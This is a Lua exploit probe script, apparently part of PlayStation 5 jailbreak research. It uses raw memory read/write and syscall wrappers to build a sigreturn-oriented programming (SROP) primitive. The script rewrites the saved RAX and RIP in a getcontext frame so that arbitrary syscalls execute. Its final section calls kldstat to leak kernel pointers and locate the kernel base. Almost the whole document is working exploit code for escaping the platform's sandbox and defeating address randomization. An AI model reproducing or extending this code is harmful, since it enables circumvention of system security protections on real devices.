-- CRASH_CLASS: HIGH
-- PROBE 128c: SROP CLEAN RETURN + ARBITRARY SYSCALL
--
-- 128b PROVED sigreturn redirects execution (AFTER_SROP_A missing).
-- Now: can we return cleanly to Lua after sigreturn?
--
-- KEY INSIGHT: sigreturn(getcontext_state) is longjmp(setjmp_state).
-- getcontext captures the instruction-after-syscall address. sigreturn
-- restores to that exact point. The code path after getcontext re-executes.
-- GPU mmap memory persists across the context switch → use as loop counter
-- to distinguish "first getcontext return" from "sigreturn return".
--
-- Sections:
--   A: getcontext → GPU counter → sigreturn → detect re-entry
--   B: If A works: modify RAX before sigreturn → observe different rv
--   C: Use captured_rip-2 as syscall gadget → getpid via SROP

print("=== PROBE 128c: SROP CLEAN RETURN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc20 = make_syscall(20)
local sc_getcontext = make_syscall(421)
local sc_sigreturn = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc624 = make_syscall(624)

local pid = to_num(sc20())
print("[0] pid=" .. pid)

-- CORRECT PS5 ucontext offsets
local MC = 0x40
local RAX = MC + 0x38
local RDI = MC + 0x08
local RSI = MC + 0x10
local RDX = MC + 0x18
local RIP = MC + 0xA0
local CS  = MC + 0xA8
local RFLAGS = MC + 0xB0
local RSP = MC + 0xB8
local SS  = MC + 0xC0
local LEN = MC + 0xC8

local CTX_SIZE = 0x500

-- GPU mmap for persistent state (survives sigreturn context switch)
local ok_mm, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x8000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("[0] gpu=" .. hex(gpu))

-- Counter cell at gpu+0x00
-- Flag cell at gpu+0x08
-- Result cell at gpu+0x10
local COUNTER = gpu
local FLAG = gpu + 8
local RESULT = gpu + 0x10

--------------------------------------------------------------------
-- SECTION A: getcontext/sigreturn loop with GPU counter
--------------------------------------------------------------------
print("")
print("--- SECTION A: setjmp/longjmp via getcontext/sigreturn ---")

wd(COUNTER, 0)  -- reset counter
wd(FLAG, 0)     -- reset flag

local ctx_a = memory.alloc(CTX_SIZE)
zero(ctx_a, CTX_SIZE)

-- This is the "setjmp" point
local ok_gc, rv_gc = pcall(function()
    return sc_getcontext(uint64(ctx_a))
end)

-- Read GPU counter to detect re-entry
local count = rd(COUNTER)
print("[A] getcontext return #" .. (count + 1) .. ": ok=" .. tostring(ok_gc)
    .. " rv=" .. hex(rv_gc))

if count == 0 then
    -- First return (real getcontext)
    wd(COUNTER, 1)
    local cap_rip = rq(ctx_a + RIP)
    local cap_rsp = rq(ctx_a + RSP)
    local cap_rax = rq(ctx_a + RAX)
    print("[A] captured: RIP=" .. hex(cap_rip) .. " RSP=" .. hex(cap_rsp)
        .. " RAX=" .. hex(cap_rax))
    print("[A] CS=" .. hex(rq(ctx_a + CS)) .. " SS=" .. hex(rq(ctx_a + SS)))

    -- Now sigreturn with the UNMODIFIED context
    -- This should "longjmp" back to the getcontext return point above
    print("[A] firing sigreturn (unmodified)...")
    local ok_sr, rv_sr = pcall(function()
        return sc_sigreturn(uint64(ctx_a))
    end)
    -- If we get here, sigreturn didn't redirect (failed)
    print("[A] sigreturn returned normally: ok=" .. tostring(ok_sr) .. " rv=" .. hex(rv_sr))
    wd(FLAG, 0xDEAD)  -- mark as failed
else
    -- WE GOT HERE VIA SIGRETURN! SROP CLEAN RETURN CONFIRMED!
    print("[A] *** SROP CLEAN RETURN CONFIRMED! ***")
    print("[A] *** Execution returned to getcontext caller via sigreturn ***")
    wd(FLAG, 0xBEEF)  -- mark success
    print("[A] pid_check=" .. to_num(sc20()))
    print("[A] 624_check=" .. to_num(sc624()))
end

local flag_a = rd(FLAG)
print("[A] flag=" .. string.format("0x%X", flag_a))

--------------------------------------------------------------------
-- SECTION B: Modify RAX before sigreturn → observe different rv
-- If A worked (flag=0xBEEF), we know clean return works.
-- Now: tag RAX with 0x1337 in the context and see if rv changes.
--------------------------------------------------------------------
if flag_a == 0xBEEF then
    print("")
    print("--- SECTION B: SROP with tagged RAX ---")

    wd(COUNTER, 0)
    wd(FLAG, 0)
    wq(RESULT, uint64(0))

    local ctx_b = memory.alloc(CTX_SIZE)
    zero(ctx_b, CTX_SIZE)

    local ok_gc2, rv_gc2 = pcall(function()
        return sc_getcontext(uint64(ctx_b))
    end)

    local count_b = rd(COUNTER)
    print("[B] getcontext return #" .. (count_b + 1) .. ": ok=" .. tostring(ok_gc2)
        .. " rv=" .. hex(rv_gc2))

    if count_b == 0 then
        wd(COUNTER, 1)

        -- Modify RAX to 0x1337
        wq(ctx_b + RAX, uint64(0x1337))
        print("[B] modified RAX=0x1337, firing sigreturn...")

        local ok_sr2, rv_sr2 = pcall(function()
            return sc_sigreturn(uint64(ctx_b))
        end)
        print("[B] sigreturn returned normally (unexpected): rv=" .. hex(rv_sr2))
        wd(FLAG, 0xDEAD)
    else
        -- Got here via sigreturn! Check rv
        local rv_h, rv_l = get_hi_lo(rv_gc2)
        wq(RESULT, rv_gc2)
        print("[B] *** SROP WITH MODIFIED RAX ***")
        print("[B] rv=" .. hex(rv_gc2) .. " (expected 0x1337 if RAX controls rv)")
        if rv_l == 0x1337 then
            print("[B] *** RAX CONTROLS RETURN VALUE! ***")
            wd(FLAG, 0xCAFE)
        else
            print("[B] RAX does NOT control rv (rv=" .. hex(rv_gc2) .. ")")
            wd(FLAG, 0xBEEF)
        end
    end

    print("[B] flag=" .. string.format("0x%X", rd(FLAG)))
end

--------------------------------------------------------------------
-- SECTION C: SROP → getpid via syscall gadget at captured_rip-2
-- If B showed we can control RAX:
-- Set RAX=20(getpid), RIP=captured_rip-2 (assumed syscall instr)
-- The syscall executes getpid, returns to captured_rip, then back to Lua
--------------------------------------------------------------------
local flag_b = rd(FLAG)
if flag_b == 0xCAFE or flag_b == 0xBEEF then
    print("")
    print("--- SECTION C: getpid via SROP ---")

    wd(COUNTER, 0)
    wd(FLAG, 0)
    wq(RESULT, uint64(0))

    local ctx_c = memory.alloc(CTX_SIZE)
    zero(ctx_c, CTX_SIZE)

    local ok_gc3, rv_gc3 = pcall(function()
        return sc_getcontext(uint64(ctx_c))
    end)

    local count_c = rd(COUNTER)
    print("[C] getcontext return #" .. (count_c + 1) .. ": ok=" .. tostring(ok_gc3)
        .. " rv=" .. hex(rv_gc3))

    if count_c == 0 then
        wd(COUNTER, 1)

        local rip_c = rq(ctx_c + RIP)
        local rip_h, rip_l = get_hi_lo(rip_c)

        -- syscall instruction is 2 bytes before the captured return address
        local syscall_addr = uint64(string.format("0x%X%08X", rip_h, rip_l - 2))
        print("[C] captured RIP=" .. hex(rip_c))
        print("[C] syscall guess=" .. hex(syscall_addr))

        -- Set RIP to syscall instruction, RAX to 20 (getpid)
        wq(ctx_c + RIP, syscall_addr)
        wq(ctx_c + RAX, uint64(20))

        print("[C] firing sigreturn with RIP=syscall, RAX=20...")

        local ok_sr3, rv_sr3 = pcall(function()
            return sc_sigreturn(uint64(ctx_c))
        end)
        -- If we get here, sigreturn didn't longjmp back
        print("[C] sigreturn returned normally (unexpected): rv=" .. hex(rv_sr3))
        wd(FLAG, 0xDEAD)
    else
        -- Got here via sigreturn after executing our syscall!
        local rv_h, rv_l = get_hi_lo(rv_gc3)
        wq(RESULT, rv_gc3)
        print("[C] *** SROP SYSCALL RETURN ***")
        print("[C] rv=" .. hex(rv_gc3))

        if rv_l == pid then
            print("[C] *** GETPID VIA SROP CONFIRMED! rv=" .. rv_l .. " == pid=" .. pid .. " ***")
            print("[C] *** ARBITRARY SYSCALL EXECUTION! ***")
            wd(FLAG, 0x6010)
        elseif rv_l > 0 and rv_l < 65536 then
            print("[C] *** POSSIBLE PID! rv=" .. rv_l .. " (expected " .. pid .. ") ***")
            wd(FLAG, 0xABCD)
        else
            print("[C] unexpected rv (not a pid)")
            wd(FLAG, 0xBEEF)
        end
    end

    print("[C] flag=" .. string.format("0x%X", rd(FLAG)))
end

--------------------------------------------------------------------
-- SECTION D: If C worked, try kldstat(308) for kernel base
--------------------------------------------------------------------
local flag_c = rd(FLAG)
if flag_c == 0xABCD or flag_c == 0xBEEF then
    print("")
    print("--- SECTION D: kldstat(308) via SROP ---")

    wd(COUNTER, 0)

    -- kld_file_stat buffer on GPU
    local kld_buf = gpu + 0x1000
    zero(kld_buf, 0x200)
    wd(kld_buf, 0x1A0)  -- version/size

    local ctx_d = memory.alloc(CTX_SIZE)
    zero(ctx_d, CTX_SIZE)

    local ok_gc4, rv_gc4 = pcall(function()
        return sc_getcontext(uint64(ctx_d))
    end)

    local count_d = rd(COUNTER)

    if count_d == 0 then
        wd(COUNTER, 1)

        local rip_d = rq(ctx_d + RIP)
        local rip_h, rip_l = get_hi_lo(rip_d)
        local syscall_addr = uint64(string.format("0x%X%08X", rip_h, rip_l - 2))

        -- kldstat(308): int kldstat(int fileid, struct kld_file_stat *stat)
        wq(ctx_d + RIP, syscall_addr)
        wq(ctx_d + RAX, uint64(308))
        wq(ctx_d + RDI, uint64(1))      -- fileid=1 (kernel)
        wq(ctx_d + RSI, kld_buf)          -- stat buffer (already uint64)

        print("[D] firing kldstat(308, 1, buf)...")
        pcall(function() return sc_sigreturn(uint64(ctx_d)) end)
        print("[D] sigreturn returned (unexpected)")
    else
        print("[D] kldstat SROP return: rv=" .. hex(rv_gc4))

        -- Dump kld_file_stat for kernel pointers
        print("[D] kld_file_stat dump:")
        local found_kptr = false
        for off = 0, 0x1A0 - 4, 8 do
            local v = rq(kld_buf + off)
            if v then
                local h, l = get_hi_lo(v)
                if h ~= 0 or l ~= 0 then
                    print(string.format("  +0x%03X: %s", off, hex(v)))
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        print("  *** KERNEL POINTER! ***")
                        found_kptr = true
                    end
                end
            end
        end

        if found_kptr then
            print("[D] *** KERNEL BASE LEAKED! ***")
        else
            print("[D] no kernel pointers in kldstat output")
        end
    end
end

print("")
print("[FINAL] pid=" .. to_num(sc20()))
print("=== PROBE 128c COMPLETE ===")
